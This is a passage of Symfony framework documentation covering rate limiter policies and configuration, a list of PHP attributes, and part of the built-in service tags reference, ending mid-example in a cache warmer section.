interval of time (e.g. 5,000 requests per hour or 3 login attempts every 15
minutes).

In the diagram below, the limit is set to "5 tokens per hour". Each window
starts at the first hit (i.e. 10:15, 11:30 and 12:30). As soon as there are
5 hits (the blue squares) in a window, all others will be rejected (red
squares).

.. raw:: html

    <object data="_images/rate_limiter/fixed_window.svg" type="image/svg+xml"
        alt="A timeline showing fixed windows that accept a maximum of 5 hits."
    ></object>

Its main drawback is that resource usage is not evenly distributed in time and
it can overload the server at the window edges. In this example,
there were 6 accepted requests between 11:00 and 12:00.

This is more significant with bigger limits. For instance, with 5,000 requests
per hour, a user could make 4,999 requests in the last minute of some
hour and another 5,000 requests during the first minute of the next hour,
making 9,999 requests in total in two minutes and possibly overloading the
server. These periods of excessive usage are called "bursts".

Sliding Window Rate Limiter
~~~~~~~~~~~~~~~~~~~~~~~~~~~

The sliding window algorithm is an alternative to the fixed window algorithm
designed to reduce bursts. This is the same example as above, but then
using a 1 hour window that slides over the timeline:

.. raw:: html

    <object data="_images/rate_limiter/sliding_window.svg" type="image/svg+xml"
        alt="The same timeline with a sliding window that accepts only 5 hits in the previous hour."
    ></object>

As you can see, this removes the edges of the window and would prevent the
6th request at 11:45.

To achieve this, the rate limit is approximated based on the current window and
the previous window.

For example: the limit is 5,000 requests per hour; a user made 4,000 requests
the previous hour and 500 requests this hour. 15 minutes in to the current hour
(25% of the window) the hit count would be calculated as: 75% * 4,000 + 500 = 3,500.
At this point in time the user can only do 1,500 more requests.

The math shows that the closer the last window is, the more the hit count
of the last window will affect the current limit. This will make sure that a user can
do 5,000 requests per hour but only if they are evenly spread out.

Token Bucket Rate Limiter
~~~~~~~~~~~~~~~~~~~~~~~~~

This technique implements the `token bucket algorithm`_, which defines
continuously updating the budget of resource usage. It roughly works like this:

#. A bucket is created with an initial set of tokens;
#. A new token is added to the bucket with a predefined frequency (e.g. every second);
#. Allowing an event consumes one or more tokens;
#. If the bucket still contains tokens, the event is allowed; otherwise, it's denied;
#. If the bucket is at full capacity, new tokens are discarded.

The below diagram shows a token bucket of size 4 that is filled with a rate
of 1 token per 15 minutes:

.. raw:: html

    <object data="_images/rate_limiter/token_bucket.svg" type="image/svg+xml"
        alt="A timeline showing the token bucket over time, as described in this section."
    ></object>

This algorithm handles more complex back-off burst management.
For instance, it can allow a user to try a password 5 times and then only
allow 1 every 15 minutes (unless the user waits 75 minutes and they will be
allowed 5 tries again).

Installation
------------

Before using a rate limiter for the first time, run the following command to
install the associated Symfony Component in your application:

.. code-block:: terminal

    $ composer require symfony/rate-limiter

Configuration
-------------

The following example creates two different rate limiters for an API service, to
enforce different levels of service (free or paid):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/rate_limiter.yaml
        framework:
            rate_limiter:
                anonymous_api:
                    # use 'sliding_window' if you prefer that policy
                    policy: 'fixed_window'
                    limit: 100
                    interval: '60 minutes'
                authenticated_api:
                    policy: 'token_bucket'
                    limit: 5000
                    rate: { interval: '15 minutes', amount: 500 }

    .. code-block:: xml

        <!-- config/packages/rate_limiter.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:rate-limiter>
                    <!-- policy: use 'sliding_window' if you prefer that policy -->
                    <framework:limiter name="anonymous_api"
                        policy="fixed_window"
                        limit="100"
                        interval="60 minutes"
                    />

                    <framework:limiter name="authenticated_api"
                        policy="token_bucket"
                        limit="5000"
                    >
                        <framework:rate interval="15 minutes"
                            amount="500"
                        />
                    </framework:limiter>
                </framework:rate-limiter>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/rate_limiter.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->rateLimiter()
                ->limiter('anonymous_api')
                    // use 'sliding_window' if you prefer that policy
                    ->policy('fixed_window')
                    ->limit(100)
                    ->interval('60 minutes')
                ;

            $framework->rateLimiter()
                ->limiter('authenticated_api')
                    ->policy('token_bucket')
                    ->limit(5000)
                    ->rate()
                        ->interval('15 minutes')
                        ->amount(500)
                ;
        };

.. note::

    The value of the ``interval`` option must be a number followed by any of the
    units accepted by the `PHP date relative formats`_ (e.g. ``3 seconds``,
    ``10 hours``, ``1 day``, etc.)

In the ``anonymous_api`` limiter, after making the first HTTP request, you can
make up to 100 requests in the next 60 minutes. After that time, the counter
resets and you have another 100 requests for the following 60 minutes.

In the ``authenticated_api`` limiter, after making the first HTTP request you
are allowed to make up to 5,000 HTTP requests in total, and this number grows
at a rate of another 500 requests every 15 minutes. If you don't make that
number of requests, the unused ones don't accumulate (the ``limit`` option
prevents that number from being higher than 5,000).

.. tip::

    All rate-limiters are tagged with the ``rate_limiter`` tag, so you can
    find them with a :doc:`tagged iterator </service_container/tags>` or
    :doc:`locator </service_container/service_subscribers_locators>`.

    .. versionadded:: 7.1

        The automatic addition of the ``rate_limiter`` tag was introduced
        in Symfony 7.1.

Rate Limiting in Action
-----------------------

After having installed and configured the rate limiter, inject it in any service
or controller and call the ``consume()`` method to try to consume a given number
of tokens. For example, this controller uses the previous rate limiter to control
the number of requests to the API::

    // src/Controller/ApiController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Exception\TooManyRequestsHttpException;
    use Symfony\Component\RateLimiter\RateLimiterFactory;

    class ApiController extends AbstractController
    {
        // if you're using service autowiring, the variable name must be:
        // "rate limiter name" (in camelCase) + "Limiter" suffix
        public function index(Request $request, RateLimiterFactory $anonymousApiLimiter): Response
        {
            // create a limiter based on a unique identifier of the client
            // (e.g. the client's IP address, a username/email, an API key, etc.)
            $limiter = $anonymousApiLimiter->create($request->getClientIp());

            // the argument of consume() is the number of tokens to consume
            // and returns an object of type Limit
            if (false === $limiter->consume(1)->isAccepted()) {
                throw new TooManyRequestsHttpException();
            }

            // you can also use the ensureAccepted() method - which throws a
            // RateLimitExceededException if the limit has been reached
            // $limiter->consume(1)->ensureAccepted();

            // to reset the counter
            // $limiter->reset();

            // ...
        }
    }

.. note::

    In a real application, instead of checking the rate limiter in all the API
    controller methods, create an :doc:`event listener or subscriber </event_dispatcher>`
    for the :ref:`kernel.request event <component-http-kernel-kernel-request>`
    and check the rate limiter once for all requests.

Wait until a Token is Available
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of dropping a request or process when the limit has been reached,
you might want to wait until a new token is available. This can be achieved
using the ``reserve()`` method::

    // src/Controller/ApiController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\RateLimiter\RateLimiterFactory;

    class ApiController extends AbstractController
    {
        public function registerUser(Request $request, RateLimiterFactory $authenticatedApiLimiter): Response
        {
            $apiKey = $request->headers->get('apikey');
            $limiter = $authenticatedApiLimiter->create($apiKey);

            // this blocks the application until the given number of tokens can be consumed
            $limiter->reserve(1)->wait();

            // optional, pass a maximum wait time (in seconds), a MaxWaitDurationExceededException
            // is thrown if the process has to wait longer. E.g. to wait at most 20 seconds:
            //$limiter->reserve(1, 20)->wait();

            // ...
        }

        // ...
    }

The ``reserve()`` method is able to reserve a token in the future. Only use
this method if you're planning to wait, otherwise you will block other
processes by reserving unused tokens.

.. note::

    Not all strategies allow reserving tokens in the future. These
    strategies may throw a ``ReserveNotSupportedException`` when calling
    ``reserve()``.

    In these cases, you can use ``consume()`` together with ``wait()``, but
    there is no guarantee that a token is available after the wait::

        // ...
        do {
            $limit = $limiter->consume(1);
            $limit->wait();
        } while (!$limit->isAccepted());

Exposing the Rate Limiter Status
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When using a rate limiter in APIs, it's common to include some standard HTTP
headers in the response to expose the limit status (e.g. remaining tokens, when
new tokens will be available, etc.)

Use the :class:`Symfony\\Component\\RateLimiter\\RateLimit` object returned by
the ``consume()`` method (also available via the ``getRateLimit()`` method of
the :class:`Symfony\\Component\\RateLimiter\\Reservation` object returned by the
``reserve()`` method) to get the value of those HTTP headers::

    // src/Controller/ApiController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\RateLimiter\RateLimiterFactory;

    class ApiController extends AbstractController
    {
        public function index(Request $request, RateLimiterFactory $anonymousApiLimiter): Response
        {
            $limiter = $anonymousApiLimiter->create($request->getClientIp());
            $limit = $limiter->consume();
            $headers = [
                'X-RateLimit-Remaining' => $limit->getRemainingTokens(),
                'X-RateLimit-Retry-After' => $limit->getRetryAfter()->getTimestamp() - time(),
                'X-RateLimit-Limit' => $limit->getLimit(),
            ];

            if (false === $limit->isAccepted()) {
                return new Response(null, Response::HTTP_TOO_MANY_REQUESTS, $headers);
            }

            // ...

            $response = new Response('...');
            $response->headers->add($headers);

            return $response;
        }
    }

.. _rate-limiter-storage:

Storing Rate Limiter State
--------------------------

All rate limiter policies require to store their state (e.g. how many hits were
already made in the current time window). By default, all limiters use the
``cache.rate_limiter`` cache pool created with the :doc:`Cache component </cache>`.
This means that every time you clear the cache, the rate limiter will be reset.

You can use the ``cache_pool`` option to override the cache used by a specific limiter
(or even :ref:`create a new cache pool <cache-create-pools>` for it):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/rate_limiter.yaml
        framework:
            rate_limiter:
                anonymous_api:
                    # ...

                    # use the "cache.anonymous_rate_limiter" cache pool
                    cache_pool: 'cache.anonymous_rate_limiter'

    .. code-block:: xml

        <!-- config/packages/rate_limiter.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:rate-limiter>
                    <!-- cache-pool: use the "cache.anonymous_rate_limiter" cache pool -->
                    <framework:limiter name="anonymous_api"
                        policy="fixed_window"
                        limit="100"
                        interval="60 minutes"
                        cache-pool="cache.anonymous_rate_limiter"
                    />

                    <!-- ... -->
                </framework:rate-limiter>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/rate_limiter.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->rateLimiter()
                ->limiter('anonymous_api')
                    // ...

                    // use the "cache.anonymous_rate_limiter" cache pool
                    ->cachePool('cache.anonymous_rate_limiter')
                ;
        };

.. note::

    Instead of using the Cache component, you can also implement a custom
    storage. Create a PHP class that implements the
    :class:`Symfony\\Component\\RateLimiter\\Storage\\StorageInterface` and
    use the ``storage_service`` setting of each limiter to the service ID
    of this class.

Using Locks to Prevent Race Conditions
--------------------------------------

`Race conditions`_ can happen when the same rate limiter is used by multiple
simultaneous requests (e.g. three servers of a company hitting your API at the
same time). Rate limiters use :doc:`locks </lock>` to protect their operations
against these race conditions.

By default, Symfony uses the global lock configured by ``framework.lock``, but
you can use a specific :ref:`named lock <lock-named-locks>` via the
``lock_factory`` option (or none at all):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/rate_limiter.yaml
        framework:
            rate_limiter:
                anonymous_api:
                    # ...

                    # use the "lock.rate_limiter.factory" for this limiter
                    lock_factory: 'lock.rate_limiter.factory'

                    # or don't use any lock mechanism
                    lock_factory: null

    .. code-block:: xml

        <!-- config/packages/rate_limiter.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:rate-limiter>
                    <!-- limiter-factory: use the "lock.rate_limiter.factory" for this limiter -->
                    <framework:limiter name="anonymous_api"
                        policy="fixed_window"
                        limit="100"
                        interval="60 minutes"
                        lock-factory="lock.rate_limiter.factory"
                    />

                    <!-- limiter-factory: or don't use any lock mechanism -->
                    <framework:limiter name="anonymous_api"
                        policy="fixed_window"
                        limit="100"
                        interval="60 minutes"
                        lock-factory="null"
                    />

                    <!-- ... -->
                </framework:rate-limiter>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/rate_limiter.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->rateLimiter()
                ->limiter('anonymous_api')
                    // ...

                    // use the "lock.rate_limiter.factory" for this limiter
                    ->lockFactory('lock.rate_limiter.factory')

                    // or don't use any lock mechanism
                    ->lockFactory(null)
                ;
        };

.. _`DoS attacks`: https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html
.. _`Apache mod_ratelimit`: https://httpd.apache.org/docs/current/mod/mod_ratelimit.html
.. _`NGINX rate limiting`: https://www.nginx.com/blog/rate-limiting-nginx/
.. _`token bucket algorithm`: https://en.wikipedia.org/wiki/Token_bucket
.. _`PHP date relative formats`: https://www.php.net/manual/en/datetime.formats.php#datetime.formats.relative
.. _`Race conditions`: https://en.wikipedia.org/wiki/Race_condition
Symfony Attributes Overview
===========================

Attributes are the successor of annotations since PHP 8. Attributes are native
to the language and Symfony takes full advantage of them across the framework
and its different components.

Doctrine Bridge
~~~~~~~~~~~~~~~

* :doc:`UniqueEntity </reference/constraints/UniqueEntity>`
* :ref:`MapEntity <doctrine-entity-value-resolver>`

Command
~~~~~~~

* :ref:`AsCommand <console_registering-the-command>`

Contracts
~~~~~~~~~

* :ref:`Required <autowiring-calls>`
* :ref:`SubscribedService <service-subscribers-service-subscriber-trait>`

Dependency Injection
~~~~~~~~~~~~~~~~~~~~

* :ref:`AsAlias <services-alias>`
* :doc:`AsDecorator </service_container/service_decoration>`
* :ref:`AsTaggedItem <tags_as-tagged-item>`
* :ref:`Autoconfigure <lazy-services_configuration>`
* :ref:`AutoconfigureTag <di-instanceof>`
* :ref:`Autowire <autowire-attribute>`
* :ref:`AutowireCallable <autowiring_closures>`
* :doc:`AutowireDecorated </service_container/service_decoration>`
* :doc:`AutowireIterator <service-locator_autowire-iterator>`
* :ref:`AutowireLocator <service-locator_autowire-locator>`
* :ref:`AutowireMethodOf <autowiring_closures>`
* :ref:`AutowireServiceClosure <autowiring_closures>`
* :ref:`Exclude <service-psr4-loader>`
* :ref:`Lazy <lazy-services_configuration>`
* :ref:`TaggedIterator <tags_reference-tagged-services>`
* :ref:`TaggedLocator <service-subscribers-locators_defining-service-locator>`
* :ref:`Target <autowiring-multiple-implementations-same-type>`
* :ref:`When <service-container_limiting-to-env>`

EventDispatcher
~~~~~~~~~~~~~~~

* :ref:`AsEventListener <event-dispatcher_event-listener-attributes>`

FrameworkBundle
~~~~~~~~~~~~~~~

* :ref:`AsRoutingConditionService <routing-matching-expressions>`

HttpKernel
~~~~~~~~~~

* :doc:`AsController </controller/service>`
* :ref:`AsTargetedValueResolver <controller-targeted-value-resolver>`
* :ref:`Cache <http-cache-expiration-intro>`
* :ref:`MapDateTime <functionality-shipped-with-the-httpkernel>`
* :ref:`MapQueryParameter <controller_map-request>`
* :ref:`MapQueryString <controller_map-request>`
* :ref:`MapRequestPayload <controller_map-request>`
* :ref:`ValueResolver <managing-value-resolvers>`
* :ref:`WithHttpStatus <framework_exceptions>`
* :ref:`WithLogLevel <framework_exceptions>`

Messenger
~~~~~~~~~

* :ref:`AsMessageHandler <messenger-handler>`

RemoteEvent
~~~~~~~~~~~

* :ref:`AsRemoteEventConsumer <webhook>`

Routing
~~~~~~~

* :doc:`Route </routing>`

Scheduler
~~~~~~~~~

* :ref:`AsCronTask <scheduler-attributes-cron-task>`
* :ref:`AsPeriodicTask <scheduler-attributes-periodic-task>`
* :ref:`AsSchedule <scheduler_attaching-recurring-messages>`

Security
~~~~~~~~

* :ref:`CurrentUser <security-json-login>`
* :ref:`IsCsrfTokenValid <csrf-controller-attributes>`
* :ref:`IsGranted <security-securing-controller-attributes>`

Serializer
~~~~~~~~~~

* :ref:`Context <serializer_serializer-context>`
* :ref:`DiscriminatorMap <serializer_interfaces-and-abstract-classes>`
* :ref:`Groups <component-serializer-attributes-groups-attributes>`
* :ref:`Ignore <serializer_ignoring-attributes>`
* :ref:`MaxDepth <serializer_handling-serialization-depth>`
* :ref:`SerializedName <serializer_name-conversion>`
* :ref:`SerializedPath <serializer-enabling-metadata-cache>`

Twig
~~~~

* :ref:`Template <templates-template-attribute>`

Symfony UX
~~~~~~~~~~

* `AsEntityAutocompleteField`_
* `AsLiveComponent`_
* `AsTwigComponent`_
* `Broadcast`_

Validator
~~~~~~~~~

Each validation constraint comes with a PHP attribute. See
:doc:`/reference/constraints` for a full list of validation constraints.

* :doc:`HasNamedArguments </validation/custom_constraint>`

Workflow
~~~~~~~~

* :ref:`AsAnnounceListener <workflow_using-events>`
* :ref:`AsCompletedListener <workflow_using-events>`
* :ref:`AsEnterListener <workflow_using-events>`
* :ref:`AsEnteredListener <workflow_using-events>`
* :ref:`AsGuardListener <workflow_using-events>`
* :ref:`AsLeaveListener <workflow_using-events>`
* :ref:`AsTransitionListener <workflow_using-events>`

.. _`AsEntityAutocompleteField`: https://symfony.com/bundles/ux-autocomplete/current/index.html#usage-in-a-form-with-ajax
.. _`AsLiveComponent`: https://symfony.com/bundles/ux-live-component/current/index.html
.. _`AsTwigComponent`: https://symfony.com/bundles/ux-twig-component/current/index.html
.. _`Broadcast`: https://symfony.com/bundles/ux-turbo/current/index.html#broadcast-conventions-and-configuration
Validation Constraints Reference
================================

The Validator is designed to validate objects against *constraints*.
In real life, a constraint could be: "The cake must not be burned". In
Symfony, constraints are similar: They are assertions that a condition is
true.

Supported Constraints
---------------------

The following constraints are natively available in Symfony:

.. include:: /reference/constraints/map.rst.inc
Built-in Symfony Service Tags
=============================

:doc:`Service tags </service_container/tags>` are the mechanism used by the
:doc:`DependencyInjection component </components/dependency_injection>` to flag
services that require special processing, like console commands or Twig extensions.

This article shows the most common tags provided by Symfony components, but in
your application there could be more tags available provided by third-party bundles.

Run this command to display tagged services in your application:

.. code-block:: terminal

    $ php bin/console debug:container --tags

To search for a specific tag, re-run this command with a search term:

.. code-block:: terminal

    $ php bin/console debug:container --tag=form.type

assets.package
--------------

**Purpose**: Add an asset package to the application

This is an alternative way to declare an :ref:`asset package <asset-packages>`.
The name of the package is set in this order:

* first, the ``package`` attribute of the tag;
* then, the value returned by the static method ``getDefaultPackageName()`` if defined;
* finally, the service name.

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Assets\AvatarPackage:
                tags:
                    - { name: assets.package, package: avatars }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Assets\AvatarPackage">
                    <tag name="assets.package" package="avatars"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Assets\AvatarPackage;

        $container
            ->register(AvatarPackage::class)
            ->addTag('assets.package', ['package' => 'avatars'])
        ;

Now you can use the ``avatars`` package in your templates:

.. code-block:: html+twig

    <img src="{{ asset('...', 'avatars') }}">

auto_alias
----------

**Purpose**: Define aliases based on the value of container parameters

Consider the following configuration that defines three different but related
services:

.. configuration-block::

    .. code-block:: yaml

        services:
            app.mysql_lock:
                class: App\Lock\MysqlLock
            app.postgresql_lock:
                class: App\Lock\PostgresqlLock
            app.sqlite_lock:
                class: App\Lock\SqliteLock

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="app.mysql_lock"
                    class="App\Lock\MysqlLock"/>
                <service id="app.postgresql_lock"
                    class="App\Lock\PostgresqlLock"/>
                <service id="app.sqlite_lock"
                    class="App\Lock\SqliteLock"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Lock\MysqlLock;
        use App\Lock\PostgresqlLock;
        use App\Lock\SqliteLock;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set('app.mysql_lock', MysqlLock::class);
            $services->set('app.postgresql_lock', PostgresqlLock::class);
            $services->set('app.sqlite_lock', SqliteLock::class);
        };

Instead of dealing with these three services, your application needs a generic
``app.lock`` service that will be an alias to one of these services, depending on
some configuration. Thanks to the ``auto_alias`` option, you can automatically create
that alias based on the value of a configuration parameter.

Considering that a configuration parameter called ``database_type`` exists. Then,
the generic ``app.lock`` service can be defined as follows:

.. configuration-block::

    .. code-block:: yaml

        services:
            app.mysql_lock:
                # ...
            app.postgresql_lock:
                # ...
            app.sqlite_lock:
                # ...
            app.lock:
                tags:
                    - { name: auto_alias, format: "app.%database_type%_lock" }

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="app.mysql_lock"
                    class="App\Lock\MysqlLock"/>
                <service id="app.postgresql_lock"
                    class="App\Lock\PostgresqlLock"/>
                <service id="app.sqlite_lock"
                    class="App\Lock\SqliteLock"/>

                <service id="app.lock">
                    <tag name="auto_alias" format="app.%database_type%_lock"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Lock\MysqlLock;
        use App\Lock\PostgresqlLock;
        use App\Lock\SqliteLock;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set('app.mysql_lock', MysqlLock::class);
            $services->set('app.postgresql_lock', PostgresqlLock::class);
            $services->set('app.sqlite_lock', SqliteLock::class);

            $services->set('app.lock')
                ->tag('auto_alias', ['format' => 'app.%database_type%_lock'])
            ;
        };

The ``format`` option defines the expression used to construct the name of the service
to alias. This expression can use any container parameter (as usual,
wrapping their names with ``%`` characters).

.. note::

    When using the ``auto_alias`` tag, it's not mandatory to define the aliased
    services as private. However, doing that (like in the above example) makes
    sense most of the times to prevent accessing those services directly instead
    of using the generic service alias.

console.command
---------------

**Purpose**: Add a command to the application

For details on registering your own commands in the service container, read
:doc:`/console/commands_as_services`.

container.hot_path
------------------

**Purpose**: Add to list of always needed services

This tag identifies the services that are always needed. It is only applied to
a very short list of bootstrapping services (like ``router``, ``event_dispatcher``,
``http_kernel``, ``request_stack``, etc.). Then, it is propagated to all dependencies
of these services, with a special case for event listeners, where only listed events
are propagated to their related listeners.

It will replace, in cache for generated service factories, the PHP autoload by
plain inlined ``include_once``. The benefit is a complete bypass of the autoloader
for services and their class hierarchy. The result is a significant performance improvement.

Use this tag with great caution, you have to be sure that the tagged service is always used.

.. _dic-tags-container-nopreload:

container.no_preload
--------------------

**Purpose**: Remove a class from the list of classes preloaded by PHP

Add this tag to a service and its class won't be preloaded when using
`PHP class preloading`_:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\SomeNamespace\SomeService:
                tags: ['container.no_preload']

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\SomeNamespace\SomeService">
                    <tag name="container.no_preload"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\SomeNamespace\SomeService;

        $container
            ->register(SomeService::class)
            ->addTag('container.no_preload')
        ;

If you add some service tagged with ``container.no_preload`` as an argument of
another service, the ``container.no_preload`` tag is applied automatically to
that service too.

.. _dic-tags-container-preload:

container.preload
-----------------

**Purpose**: Add some class to the list of classes preloaded by PHP

When using `PHP class preloading`_, this tag allows you to define which PHP
classes should be preloaded. This can improve performance by making some of the
classes used by your service always available for all requests (until the server
is restarted):

.. configuration-block::

    .. code-block:: yaml

        services:
            App\SomeNamespace\SomeService:
                tags:
                    - { name: 'container.preload', class: 'App\SomeClass' }
                    - { name: 'container.preload', class: 'App\Some\OtherClass' }
                    # ...

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\SomeNamespace\SomeService">
                    <tag name="container.preload" class="App\SomeClass"/>
                    <tag name="container.preload" class="App\Some\OtherClass"/>
                    <!-- ... -->
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Some\OtherClass;
        use App\SomeClass;
        use App\SomeNamespace\SomeService;

        $container
            ->register(SomeService::class)
            ->addTag('container.preload', ['class' => SomeClass::class])
            ->addTag('container.preload', ['class' => OtherClass::class])
            // ...
        ;

controller.argument_value_resolver
----------------------------------

**Purpose**: Register a value resolver for controller arguments such as ``Request``

Value resolvers implement the
:class:`Symfony\\Component\\HttpKernel\\Controller\\ValueResolverInterface`
and are used to resolve argument values for controllers as described here:
:doc:`/controller/argument_value_resolver`.

data_collector
--------------

**Purpose**: Create a class that collects custom data for the profiler

For details on creating your own custom data collection, read the
:ref:`profiler-data-collector` article.

doctrine.event_listener
-----------------------

**Purpose**: Add a Doctrine event listener

For details on creating Doctrine event listeners, read the
:doc:`Doctrine events </doctrine/events>` article.

doctrine.event_subscriber
-------------------------

**Purpose**: Add a Doctrine event subscriber

For details on creating Doctrine event subscribers, read the
:doc:`Doctrine events </doctrine/events>` article.

.. _dic-tags-form-type:

form.type
---------

**Purpose**: Create a custom form field type

For details on creating your own custom form type, read the
:doc:`/form/create_custom_field_type` article.

form.type_extension
-------------------

**Purpose**: Create a custom "form extension"

For details on creating Form type extensions, read the
:doc:`/form/create_form_type_extension` article.

.. _reference-dic-type_guesser:

form.type_guesser
-----------------

**Purpose**: Add your own logic for "form type guessing"

This tag allows you to add your own logic to the :ref:`form guessing <form-type-guessing>`
process. By default, form guessing is done by "guessers" based on the validation
metadata and Doctrine metadata (if you're using Doctrine) or Propel metadata
(if you're using Propel).

.. seealso::

    For information on how to create your own type guesser, see
    :doc:`/form/type_guesser`.

kernel.cache_clearer
--------------------

**Purpose**: Register your service to be called during the cache clearing
process

Cache clearing occurs whenever you call ``cache:clear`` command. If your
bundle caches files, you should add a custom cache clearer for clearing those
files during the cache clearing process.

In order to register your custom cache clearer, first you must create a
service class::

    // src/Cache/MyClearer.php
    namespace App\Cache;

    use Symfony\Component\HttpKernel\CacheClearer\CacheClearerInterface;

    class MyClearer implements CacheClearerInterface
    {
        public function clear(string $cacheDirectory): void
        {
            // clear your cache
        }
    }

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
your service will be automatically tagged with ``kernel.cache_clearer``. But, you
can also register it manually:

.. configuration-block::

    .. code-block:: yaml

        services:
            App\Cache\MyClearer:
                tags: [kernel.cache_clearer]

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Cache\MyClearer">
                    <tag name="kernel.cache_clearer"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        use App\Cache\MyClearer;

        $container
            ->register(MyClearer::class)
            ->addTag('kernel.cache_clearer')
        ;

kernel.cache_warmer
-------------------

**Purpose**: Register your service to be called during the cache warming
process

Cache warming occurs whenever you run the ``cache:warmup`` or ``cache:clear``
command (unless you pass ``--no-warmup`` to ``cache:clear``). It is also run
when handling the request, if it wasn't done by one of the commands yet.

The purpose is to initialize any cache that will be needed by the application
and prevent the first user from any significant "cache hit" where the cache
is generated dynamically.

To register your own cache warmer, first create a service that implements
the :class:`Symfony\\Component\\HttpKernel\\CacheWarmer\\CacheWarmerInterface` interface::

    // src/Cache/MyCustomWarmer.php
    namespace App\Cache;

    use App\Foo\Bar;
    use Symfony\Component\HttpKernel\CacheWarmer\CacheWarmerInterface;

    class MyCustomWarmer implements CacheWarmerInterface
    {
        public function warmUp(string $cacheDir, ?string $buildDir = null): array
        {
            // ... do some sort of operations to "warm" your cache

            $filesAndClassesToPreload = [];
            $filesAndClassesToPreload[] = Bar::class;

            foreach (scandir($someCacheDir) as $file) {
                if (!is_dir($file = $someCacheDir.'/'.$file)) {
                    $filesAndClassesToPreload[] = $file;
                }
            }

            return $filesAndClassesToPreload;
        }

